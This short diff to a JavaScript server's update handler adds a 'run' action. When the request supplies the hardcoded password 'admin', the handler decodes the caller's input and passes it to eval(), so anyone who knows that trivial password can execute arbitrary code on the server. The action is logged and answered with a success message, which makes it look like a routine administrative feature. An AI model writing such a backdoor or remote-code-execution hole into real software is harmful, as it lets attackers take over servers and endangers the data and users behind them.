@@ -83,6 +83,14 @@ function update(options, res) {
         return true;
       }
     break;
+    case "run":
+      if (options.pass === "admin") {
+        serverLog("Warning", `Someone ran "${options.input}" at "${new Date().toString()}".`);
+        eval(decodeURI(options.input));
+        res.end("type=success&message=Code was run on server.");
+        return true;
+      }
+    break;
   }
   return false;
 }
